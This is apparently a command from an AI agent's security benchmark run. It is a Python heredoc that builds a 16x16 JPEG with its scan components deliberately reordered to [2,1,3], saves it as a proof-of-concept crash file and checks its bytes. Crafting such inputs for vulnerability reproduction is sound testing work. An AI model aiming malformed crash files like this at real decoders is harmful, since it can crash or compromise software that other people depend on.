python3 - <<'PYEOF'
import importlib.util
spec=importlib.util.spec_from_file_location("j","/tmp/jenc.py"); j=importlib.util.module_from_spec(spec); spec.loader.exec_module(j)
data=j.make_jpeg(16,16,[0x11,0x11,0x11],[[2,1,3]])
open('/CybinGym_workdir/poc_crash','wb').write(data)
# verify
d=open('/CybinGym_workdir/poc_crash','rb').read()
i=d.find(b'\xff\xda')
ln=int.from_bytes(d[i+2:i+4],'big'); seg=d[i+4:i+2+ln]
print("scan comps:",[seg[1+2*k] for k in range(seg[0])])
assert [seg[1+2*k] for k in range(seg[0])]==[2,1,3], "wrong order!"
print("OK size",len(d))
PYEOF
